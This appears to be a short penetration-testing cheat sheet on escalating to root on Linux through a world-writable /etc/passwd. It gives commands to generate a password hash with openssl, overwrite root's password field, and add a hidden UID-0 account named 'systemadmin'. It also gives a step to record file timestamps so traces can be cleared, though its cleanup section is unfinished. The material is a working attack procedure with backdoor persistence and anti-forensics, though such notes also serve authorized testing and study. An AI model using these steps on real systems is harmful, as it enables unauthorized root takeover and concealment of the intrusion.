# Living off the Land

## 01 - Detect

Weak File Permissions - Writable `/etc/passwd`

```
$ ls -l /etc/passwd
```

## 02 - Exploit

Generate a new hash password.

```
$ openssl passwd -1 thispass123
```

For older linux systems

```
$ openssl passwd -1 -salt new thispass123
```

Before resetting the password. Take note of the timestamp to clear traces ahead of time.

```
$ stat /etc/passwd
```

### 2.1 - Overwrite password via hash digest

Replace the letter `x` for the newly generated salt hash for the `/etc/passwd`.

```
root:x:0:0:root:/root:/bin/bash
```

Authenticate as root with the password

```
$ su root
```

### 2.2 - Create User Account

Create a new account as root with the previous generated hashed password. Here's what the format looks like:

Note: replace `<new_hash>` with the hashed password

```
systemadmin:<new_hash>:0:0:Sysadmin:/root:/bin/bash
```

## 03 - Cleanup

TODO: Fill in this info

```
$ touch
```

---
## References

- [Linux Privesc Wrong Permissions](https://wixnic.github.io/linux-privesc-wrong-permissions/)

- [Linux Privilege Escalation Writable Passwd File](https://steflan-security.com/linux-privilege-escalation-writable-passwd-file/)